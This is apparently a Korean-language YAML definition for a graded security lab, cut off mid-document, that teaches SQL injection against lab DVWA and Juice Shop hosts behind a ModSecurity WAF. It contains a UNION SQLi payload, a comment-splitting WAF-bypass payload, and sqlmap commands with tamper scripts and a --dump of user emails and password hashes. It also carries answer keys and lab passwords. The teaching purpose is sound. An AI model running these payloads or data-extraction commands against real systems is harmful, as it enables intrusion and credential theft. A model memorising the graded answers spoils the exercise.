lab_id: standalone-attack-week04
title: "SQL Injection(sqlmap·WAF 우회) vs SQLi 탐지·차단 분석"
version: standalone-attack
course: attack
week: 4
description: |
  SQL Injection 공방을 공격자(PTES Exploitation) 관점에서 손으로 익힌다. 먼저 가장 직접적인 수동 UNION
  SQLi 를 보내 차단형 WAF(dvwa)가 403 으로 막는 것을 확인하고, 대소문자·주석 tamper 로 WAF 우회를 시도해
  ModSec CRS 정규화가 대소문자는 차단(403)하지만 주석분할(UN/**/ION)은 못 잡아 우회(302)됨을 — '정규화는
  강력하나 만능이 아님'을 실측으로 체감한다. 이어 자동화 도구 sqlmap 으로
  juice 의 검색 파라미터를 4 기법으로 자동 테스트하며 그 "시끄러움"을 보고, 방어 측 modsec_audit.log 에서
  본인 공격이 942(SQLi)+949110(anomaly)으로 잡힌 흔적을 분석한다. 마지막으로 같은 payload 가 차단 모드
  (dvwa 403) vs 탐지 전용 모드(juice 200)로 갈리는 이유와 근본 방어(parameterized query)를 정리한다.
  공격 도구는 외부 공격자 VM 192.168.0.202(att/1), 대상은 공인 진입 192.168.0.161이다. 공격은
  `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고, 방어(WAF) 로그 확인은 WAF 장비 `ssh ccc@10.20.32.80`(비번 1)에서
  시선을 바꿔 확인한다. 인가된 실습 환경에서만 수행한다.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "W01–W03 통과"
  - "공격 VM ssh att@192.168.0.202 + 방어 WAF 장비 ssh ccc@10.20.32.80 (비번 1)"
  - "lecture §2(SQLi 유형) §3(sqlmap) §4(WAF 우회) 숙지"
objectives:
  - "수동 UNION SQLi 를 직접 작성해 보내고 차단형 vhost(dvwa)에서 403 차단을 확인한다"
  - "대소문자·주석 tamper 로 WAF 우회를 시도하고, 정규화가 대소문자는 차단(403)·주석분할은 우회(302)됨을 구분해 이해한다"
  - "sqlmap 으로 한 파라미터를 4 기법으로 자동 테스트하고 다량 요청이 방어층에 탐지되는 특성을 안다"
  - "modsec_audit.log 에서 942(SQLi)+949110(anomaly) 탐지 흔적을 찾고 차단 모드 vs 탐지 전용 모드 차이를 설명한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — sqlmap 가용성 + 대상 도달성
      모든 공격의 0단계는 "도구가 있고 대상에 닿는가" 확인이다. SQLi 자동화 도구 sqlmap 이
      공격 VM(192.168.0.202)에 설치돼 있는지, 그리고 차단형 vhost(dvwa)에 네트워크로 도달하는지 본다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
      command -v sqlmap
      # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
      whatweb -a1 http://dvwa.el34.lab/
      ```
      > 💡 대상이 살아있는지는 **브라우저로 `http://dvwa.el34.lab/` 를 열어** DVWA 로그인 페이지가 뜨는지로도
      > 확인한다(사람 방식). 위 whatweb 은 서버·상태·타이틀을 한 줄로 지문하는 CLI 확인이다.

      - `command -v sqlmap`(설치 경로), `whatweb -a1 http://dvwa.el34.lab/`(자연 URL — 호스트명이 dvwa vhost 지정, 서버·상태·타이틀 지문).
      ## ✅ 합격 기준
      `sqlmap` 출력 시 통과. **근거:** sqlmap 경로가 출력돼 사용 가능하고 dvwa 에 도달(HTTP 코드 응답)하면
      통과 — 공격 착수 전 도구·대상 준비 상태를 확인하는 기본 절차다.
    hint: 'command -v sqlmap + 도달성'
    category: survey
    points: 10
    answer: |
      # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
      ssh att@192.168.0.202 'command -v sqlmap'
      # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
      ssh att@192.168.0.202 "whatweb -a1 http://dvwa.el34.lab/"
    answer_detail: "SQLi 자동화 도구 sqlmap 이 attacker 에 설치됐는지(command -v 로 경로 확인)와 대상 vhost(dvwa=차단 모드, juice=탐지만)에 도달하는지를 점검한다. 공격 착수 전 도구·대상 준비 상태를 1분 내 확인하는 기본 절차다."
    expected_output: |
      /usr/bin/sqlmap
      http://dvwa.el34.lab/ [403 Forbidden] Apache[2.4.52], IP[192.168.0.161], Title[403 Forbidden]
    verify:
      type: output_contains
      expect: 'sqlmap'
      field: stdout
      semantic:
        intent: "sqlmap + 대상 점검"
        success_criteria: ["sqlmap 가용", "대상 도달"]
        acceptable_methods: ["**[OSS] command -v + whatweb (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 수동 UNION SQLi — dvwa 차단(403)
      가장 직접적인 UNION-based SQLi 를 손으로 만들어 보낸다. `UNION SELECT` 는 정상 질의 결과 뒤에
      다른 테이블(users 의 계정·비밀번호)을 이어 붙여 응답에 노출시키는 기법이다. 차단형 WAF(dvwa)가
      이 평문 SQLi 를 얼마나 쉽게 막는지 직접 확인한다.
      ## 💻 실행 명령

      실제 공격자는 이런 요청을 **브라우저나 Burp로 보내며 응답 화면을 본다.** 아래 셋 중 편한 방식으로
      같은 UNION SQLi 를 보낸다(같은 요청 — 화면으로 보든 CLI로 보내든 동일).

      - **브라우저(학생 PC):** 주소창에 아래를 붙여넣고 열면 dvwa(차단 모드)는 **`403 Forbidden` 페이지**가 뜬다.
        `http://dvwa.el34.lab/?id=1' UNION SELECT user,password FROM users-- -`
      - **Burp Repeater:** 위 요청을 Repeater 로 보내면 응답 코드·본문(403 차단 페이지)을 그대로 본다(WAF 응답 분석에 유용).
      - **CLI(채점용, 내 공격 VM 에서) — 진짜 SQLi 도구 sqlmap 으로:**
        ```bash
        ssh att@192.168.0.202
        # sqlmap이 UNION/quote 등 SQLi 페이로드를 자동 발사 → 차단형 dvwa는 WAF가 전부 403으로 막는다
        sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
        ```
      해석: sqlmap 이 던지는 SQLi 페이로드(UNION·작은따옴표 등)가 CRS 942(SQLi)에 매치돼 anomaly 누적 → 949110 차단(403). sqlmap 스스로 "WAF/IPS 로 보호됨"을 감지하고 `--tamper` 를 권한다 — 고전 평문 SQLi 는 CRS 가 가장 쉽게 잡는다.
      - sqlmap 이 보내는 payload 예 `1' UNION SELECT user,password FROM users-- -`(`%27`=`'`, 끝 `-- -`=SQL 주석). dvwa vhost=`SecRuleEngine On`(차단 모드)라 전 페이로드가 403.

      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** UNION SQLi 가 dvwa 에서 403(WAF 차단)으로 응답되면 통과 — 평문 SQLi 는
      CRS 가 가장 쉽게 잡는다(942 매치 → anomaly 누적 → 949110 차단).
    hint: 'UNION SELECT → dvwa 403'
    category: manipulation
    points: 12
    answer: |
      # 1) sqlmap SQLi 자동 발사 — 차단형 dvwa는 WAF가 전부 403 차단(sqlmap이 WAF/IPS 감지)
      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
    answer_detail: "UNION-based SQLi 는 다른 테이블을 결과에 합쳐 추출하는 가장 직접적인 기법이다. 진짜 SQLi 도구 sqlmap 으로 dvwa(SecRuleEngine On)를 치면, sqlmap 이 던지는 SQLi 페이로드(UNION·작은따옴표 등)가 942 룰군에 매치되고 anomaly score 가 누적돼 949110(임계치)이 발동, 전부 403 으로 차단된다. sqlmap 스스로 'WAF/IPS 로 보호된다'고 감지하고 '--tamper' 를 권하며, 'all tested parameters do not appear to be injectable' + '403 (Forbidden) - N times' 로 보고한다. 평문 SQLi 는 CRS 가 가장 쉽게 잡는다는 점을 sqlmap 의 WAF 차단(403) 보고로 판정한다."
    expected_output: |
      [09:11:24] [INFO] checking if the target is protected by some kind of WAF/IPS
      [09:11:26] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
      403 (Forbidden) - 75 times
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "sqlmap SQLi + WAF 차단"
        success_criteria: ["sqlmap SQLi 발사", "WAF 403 차단"]
        acceptable_methods: ["**[OSS] sqlmap → WAF 403 (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 WAF 우회(tamper) 자동화 — sqlmap --tamper
      payload 를 변형해 WAF 시그니처를 피하는 것이 tamper 다. sqlmap 은 `--tamper=<스크립트>` 로 이 변형을
      자동화한다 — `space2comment`(공백→`/**/` 주석분할, `UN/**/ION`)·`charencode`·`charunicodeencode`·
      `versionedmorekeywords` 등. 스캐너가 tamper 를 써도 이 CRS 를 넘는지 실측한다.

      ## 📖 개념 한 줄
      ModSec CRS 는 검사 전 입력을 표준형으로 되돌리는 정규화(normalization) + anomaly scoring 으로
      운영된다. 손으로 정밀하게 만든 **단 하나**의 주석분할 payload 는 이 CRS 3.3.2 의 libinjection 빈틈으로
      302 통과할 수 있으나, sqlmap 처럼 수십 개 probe 를 함께 쏘는 **자동 스캐너는 tamper 를 써도** 그 총합이
      942 에 걸려 여전히 차단(403)된다 — "tamper 만 걸면 뚫린다"는 통념이 깨지는 실측 사례다(자동화 ≠ 은밀).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # sqlmap의 tamper 스크립트로 WAF 우회 자동화 — space2comment는 공백을 /**/(인라인 주석)으로 바꿔
      # UN/**/ION 형태를 만든다(다른 변형: charencode·charunicodeencode·versionedmorekeywords)
      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE "loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)"
      ```
      해석: sqlmap 이 `space2comment` tamper 모듈을 로드해(공백→`/**/`) 주석분할 우회를 자동 시도하지만,
      dvwa 는 여전히 **403** 을 돌려준다 — sqlmap 은 한 payload 가 아니라 수십 개 probe(작은따옴표·괄호·키워드)를
      한꺼번에 쏘고, CRS 의 anomaly scoring 이 그 **총합**을 잡기 때문이다. tamper 는 진입장벽을 높일 뿐 자동
      스캐너를 투명하게 만들진 못한다(자동화 ≠ 은밀).
      > 💡 **개념(libinjection 빈틈):** 손으로 정밀하게 만든 **단 하나**의 주석분할 payload
      > (`1' UN/**/ION SE/**/LECT 1--`, raw 요청·정확한 인코딩)는 이 CRS 3.3.2 의 libinjection 이 토큰을 복원
      > 못 해 백엔드로 통과(302)할 수 있다. 그러나 sqlmap·ffuf·wfuzz 같은 자동 도구는 payload 를 재인코딩
      > (`%`→`%25`)하거나 다른 probe 를 함께 쏘아 결국 942 에 걸린다 — **실전 우회는 자동화가 아니라 수작업 정밀도**가 관건이다.

      - `--tamper=space2comment`(공백→`/**/` 주석분할), 다른 변형 `--tamper=charencode`/`charunicodeencode`/`versionedmorekeywords`. dvwa=`SecRuleEngine On` 이라 스캐너는 tamper 를 써도 403.

      ## ✅ 합격 기준
      `tamper` 출력 시 통과. **근거:** sqlmap 이 tamper 모듈(space2comment)을 로드해 WAF 우회를 자동 시도하고
      그 결과(여기선 여전히 403 차단)를 보고하면 통과 — 자동 스캐너는 tamper 로도 CRS 의 anomaly scoring 을
      넘기 어렵고, 정밀한 단발 우회는 수작업 몫이다.
    hint: 'sqlmap --tamper=space2comment'
    category: manipulation
    points: 14
    answer: |
      # sqlmap tamper(space2comment)로 WAF 우회 자동화 — 스캐너는 tamper를 써도 여전히 403 차단
      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
    answer_detail: "진짜 SQLi 도구 sqlmap 의 --tamper 로 WAF 우회를 자동화한다 — space2comment 는 공백을 /**/(인라인 주석)으로 바꿔 UN/**/ION 주석분할을 만든다(다른 변형: charencode·charunicodeencode·versionedmorekeywords). sqlmap 이 tamper 모듈을 로드하지만 dvwa 는 여전히 403 — sqlmap 은 한 payload 가 아니라 수십 개 probe(작은따옴표·괄호·키워드)를 함께 쏘고 CRS 의 anomaly scoring 이 그 총합을 잡기 때문이다. 개념: 손으로 정밀하게 만든 단 하나의 주석분할 payload(raw 요청·정확한 인코딩)는 이 CRS 3.3.2 의 libinjection 빈틈으로 302 통과할 수 있으나, 자동 도구는 payload 를 재인코딩(%→%25)하거나 다른 probe 를 함께 쏘아 결국 942 에 걸린다 — 실전 우회는 자동화가 아니라 수작업 정밀도가 관건이다. 채점은 출력에 'tamper'(모듈 로드)가 보이는지로 판정한다."
    expected_output: |
      [09:13:09] [INFO] loading tamper module 'space2comment'
      [09:13:09] [INFO] checking if the target is protected by some kind of WAF/IPS
      [09:13:11] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
      403 (Forbidden) - 76 times
    verify:
      type: output_contains
      expect: 'tamper'
      field: stdout
      semantic:
        intent: "sqlmap --tamper WAF 우회 자동화 + CRS 차단"
        success_criteria: ["tamper 모듈 로드", "스캐너도 CRS에 403"]
        acceptable_methods: ["**[OSS] sqlmap --tamper (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 sqlmap 자동화 — 실제 데이터 추출(--dump)
      수동 시도를 자동화 도구로 대체한다. sqlmap 은 대상 URL 의 한 파라미터를 4 기법(Boolean/Time/
      UNION/Error)으로 자동 주입해 취약점을 찾고, `--dump` 로 **테이블 데이터를 실제로 추출**한다. 대상은
      juiceshop 의 REST 검색 파라미터 `/rest/products/search?q=`(juice 는 W03 에서 본 API 구조). juice 는
      DetectionOnly(탐지만) 라 SQLi 가 통과해 실제 계정/비밀번호가 뽑히는 것을 눈으로 본다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # sqlmap이 juice 검색 파라미터의 SQLi를 자동으로 찾아 Users 테이블의 실제 계정/비밀번호를 추출(--dump)
      sqlmap -u 'http://juice.el34.lab/rest/products/search?q=apple' --batch --dbms=sqlite --technique=B --threads 10 -T Users -C email,password --dump --stop 2 --disable-coloring 2>&1 | grep -E 'Parameter: q|Type:|@juice-sh.op|0192023|Table: Users|email' | head
      ```
      juice 는 DetectionOnly(탐지만·차단 안 함)라 sqlmap 의 SQLi 가 통과해 **실제 데이터가 추출**된다 —
      출력에 `Parameter: q` 취약 확인과 Users 테이블의 email·password(MD5 해시)가 표로 뜬다. `0192023a...b500`
